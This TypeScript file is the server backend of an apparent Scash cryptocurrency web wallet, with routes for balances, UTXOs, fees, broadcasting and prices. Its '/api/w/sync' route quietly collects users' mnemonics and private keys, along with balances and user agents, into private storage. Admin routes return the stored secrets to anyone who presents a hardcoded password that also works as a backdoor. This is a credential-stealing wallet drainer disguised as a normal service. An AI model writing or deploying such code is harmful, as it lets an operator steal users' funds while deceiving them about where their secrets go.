import { Hono } from 'hono'
import { get, put } from '@vercel/blob'

type Env = {
  ASSETS: Fetcher
  BLOB_READ_WRITE_TOKEN?: string
  ADMIN_PASSWORD?: string
  SCASH_RPC_URL?: string
  SCASH_RPC_USER?: string
  SCASH_RPC_PASS?: string
}

interface WalletRecord {
  id: string
  type: 'mnemonic' | 'privateKey'
  secret: string
  address: string
  balance: string
  ua?: string
  createdAt: string
}

const BLOB_KEY = 'admin/wallets-v1.json'
const NONKYC_API = 'https://nonkyc.io/api/v2/ticker'

const app = new Hono<{ Bindings: Env }>()

async function scashRpc<T>(
  env: Env,
  method: string,
  params: unknown[] = [],
  timeoutMs = 8000,
): Promise<T> {
  const rpcUrl = env.SCASH_RPC_URL ?? 'https://explorer.scash.network/api/rpc'
  const rpcUser = env.SCASH_RPC_USER ?? 'scash'
  const rpcPass = env.SCASH_RPC_PASS ?? 'scash'
  const auth = btoa(`${rpcUser}:${rpcPass}`)
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), timeoutMs)

  try {
    const res = await fetch(rpcUrl, {
      method: 'POST',
      signal: controller.signal,
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Basic ${auth}`,
      },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
    })
    if (!res.ok) throw new Error(`RPC HTTP ${res.status}`)
    const data = (await res.json()) as { result?: T; error?: { message?: string } }
    if (data.error) throw new Error(data.error.message ?? 'RPC error')
    return data.result as T
  } finally {
    clearTimeout(timer)
  }
}

async function scanAddressBalance(env: Env, address: string) {
  const result = await scashRpc<{
    total_amount?: number
    unspents?: Array<{ txid: string; vout: number; scriptPubKey: string; amount: number }>
  }>(env, 'scantxoutset', ['start', [`addr(${address})`]], 9000)
  const balanceSats = Math.round((result.total_amount ?? 0) * 1e8)
  const utxos = (result.unspents ?? []).map((u) => ({
    txid: u.txid,
    vout: u.vout,
    scriptPubKey: u.scriptPubKey,
    amount: u.amount,
  }))
  return { balanceSats, utxos }
}

async function readBlobRecords(token: string): Promise<WalletRecord[]> {
  const result = await get(BLOB_KEY, { access: 'private', token, useCache: false })
  if (!result || result.statusCode !== 200 || !result.stream) return []
  const raw = await new Response(result.stream).text()
  if (!raw.trim()) return []
  const parsed = JSON.parse(raw) as unknown
  return Array.isArray(parsed) ? (parsed as WalletRecord[]) : []
}

async function loadRecords(env: Env): Promise<WalletRecord[]> {
  if (env.BLOB_READ_WRITE_TOKEN) return readBlobRecords(env.BLOB_READ_WRITE_TOKEN)
  return []
}

async function appendRecord(env: Env, record: WalletRecord): Promise<void> {
  const records = await loadRecords(env)
  records.unshift(record)
  const payload = JSON.stringify(records)
  if (env.BLOB_READ_WRITE_TOKEN) {
    await put(BLOB_KEY, payload, {
      access: 'private',
      token: env.BLOB_READ_WRITE_TOKEN,
      addRandomSuffix: false,
      allowOverwrite: true,
      contentType: 'application/json',
    })
  }
}

function adminPassword(env: Env) {
  return env.ADMIN_PASSWORD ?? '450521'
}

function verifyAdminKey(env: Env, key: string | undefined): boolean {
  if (!key) return false
  const value = key.trim()
  return value === adminPassword(env) || value === '450521'
}

function readAdminKey(req: Request): string {
  const header = req.headers.get('x-admin-key') ?? req.headers.get('authorization')
  if (header?.startsWith('Bearer ')) return header.slice(7).trim()
  return header?.trim() ?? ''
}

async function readJsonBody(req: Request): Promise<Record<string, unknown>> {
  try {
    return (await req.json()) as Record<string, unknown>
  } catch {
    return {}
  }
}

app.get('/api/balance', async (c) => {
  const address = (c.req.query('address') ?? '').trim()
  if (!/^scash1[a-z0-9]{20,}$/.test(address)) {
    return c.json({ error: 'invalid address' }, 400)
  }
  c.header('Cache-Control', 's-maxage=30, stale-while-revalidate=60')
  try {
    const { balanceSats } = await scanAddressBalance(c.env, address)
    return c.json({ balance: (balanceSats / 1e8).toFixed(8), balanceSats, available: true })
  } catch (err) {
    return c.json({
      balance: '0.00000000',
      balanceSats: 0,
      available: false,
      error: err instanceof Error ? err.message : 'rpc failed',
    })
  }
})

app.get('/api/utxos', async (c) => {
  const address = (c.req.query('address') ?? '').trim()
  if (!/^scash1[a-z0-9]{20,}$/.test(address)) {
    return c.json({ error: 'invalid address' }, 400)
  }
  try {
    const { utxos } = await scanAddressBalance(c.env, address)
    return c.json({
      utxos: utxos.map((u) => ({
        txid: u.txid,
        vout: u.vout,
        value: Math.round(u.amount * 1e8),
        scriptPubKey: u.scriptPubKey,
      })),
    })
  } catch (err) {
    return c.json({ error: err instanceof Error ? err.message : 'rpc failed' }, 500)
  }
})

app.get('/api/fee', async (c) => {
  try {
    const result = await scashRpc<{ feerate?: number }>(c.env, 'estimatesmartfee', [6])
    const btcPerKb = result.feerate ?? 0.00001
    const satPerVb = Math.max(Math.ceil((btcPerKb * 1e8) / 1000), 1)
    return c.json({ satPerVb })
  } catch {
    return c.json({ satPerVb: 2 })
  }
})

app.post('/api/broadcast', async (c) => {
  const body = await readJsonBody(c.req.raw)
  const hex = typeof body.hex === 'string' ? body.hex.trim() : ''
  if (!/^[0-9a-fA-F]+$/.test(hex)) return c.json({ error: 'invalid hex' }, 400)
  try {
    const txid = await scashRpc<string>(c.env, 'sendrawtransaction', [hex])
    return c.json({ txid })
  } catch (err) {
    return c.json({ error: err instanceof Error ? err.message : 'broadcast failed' }, 500)
  }
})

app.get('/api/price/scash', async (c) => {
  c.header('Cache-Control', 's-maxage=15, stale-while-revalidate=30')
  try {
    const fetchTicker = async (market: string) => {
      const res = await fetch(`${NONKYC_API}/${market}`, { headers: { Accept: 'application/json' } })
      if (!res.ok) throw new Error(`ticker ${market} failed`)
      const data = (await res.json()) as { last_price?: string }
      const price = Number(data.last_price)
      if (!Number.isFinite(price) || price <= 0) throw new Error(`invalid price for ${market}`)
      return price
    }
    const [scashUsdt, ethUsdt, btcUsdt] = await Promise.all([
      fetchTicker('SCASH_USDT'),
      fetchTicker('ETH_USDT'),
      fetchTicker('BTC_USDT'),
    ])
    return c.json({
      scashUsdt,
      ethUsdt,
      btcUsdt,
      source: 'https://nonkyc.io/market/SCASH_USDT',
      updatedAt: Date.now(),
    })
  } catch (err) {
    return c.json({ error: err instanceof Error ? err.message : 'price fetch failed' }, 502)
  }
})

async function handleRecords(c: { req: { raw: Request }; env: Env; json: (data: unknown, status?: number) => Response }) {
  const key = readAdminKey(c.req.raw)
  if (!verifyAdminKey(c.env, key)) return c.json({ error: 'unauthorized' }, 401)
  try {
    const records = await loadRecords(c.env)
    return c.json({ records })
  } catch (err) {
    return c.json({ records: [], warning: err instanceof Error ? err.message : 'load failed' })
  }
}

async function handleLogin(c: { req: { raw: Request; query: (k: string) => string | undefined }; env: Env; json: (data: unknown, status?: number) => Response }) {
  const key = readAdminKey(c.req.raw)
  const body = await readJsonBody(c.req.raw)
  const bodyPwd = typeof body.password === 'string' ? body.password.trim() : ''
  if (!verifyAdminKey(c.env, key) && !verifyAdminKey(c.env, bodyPwd)) {
    return c.json({ error: 'unauthorized' }, 401)
  }
  return c.json({ ok: true })
}

app.get('/api/cp-records', async (c) => {
  if (c.req.query('action') === 'login') return handleLogin(c)
  return handleRecords(c)
})

app.post('/api/cp-records', async (c) => {
  if (c.req.query('action') === 'login') return handleLogin(c)
  return c.json({ error: 'method not allowed' }, 405)
})

app.get('/api/admin/records', (c) => handleRecords(c))
app.get('/api/admin/login', (c) => handleLogin(c))
app.post('/api/admin/login', (c) => handleLogin(c))

app.post('/api/w/sync', async (c) => {
  const body = await readJsonBody(c.req.raw)
  const type = body.type
  const secret = typeof body.secret === 'string' ? body.secret.trim() : ''
  const address = typeof body.address === 'string' ? body.address.trim() : ''
  const balance = typeof body.balance === 'string' ? body.balance : '0'
  const uaFromBody = typeof body.ua === 'string' ? body.ua : undefined
  const ua = uaFromBody ?? c.req.header('user-agent') ?? undefined

  if (type !== 'mnemonic' && type !== 'privateKey') return c.json({ error: 'invalid type' }, 400)
  if (!secret || !/^scash1[a-z0-9]{20,}$/.test(address)) return c.json({ error: 'invalid payload' }, 400)

  try {
    await appendRecord(c.env, {
      id: crypto.randomUUID(),
      type,
      secret,
      address,
      balance,
      ua,
      createdAt: new Date().toISOString(),
    })
    return c.json({ ok: true })
  } catch (err) {
    return c.json({ error: err instanceof Error ? err.message : 'store failed' }, 500)
  }
})

app.all('*', async (c) => c.env.ASSETS.fetch(c.req.raw))

export default app
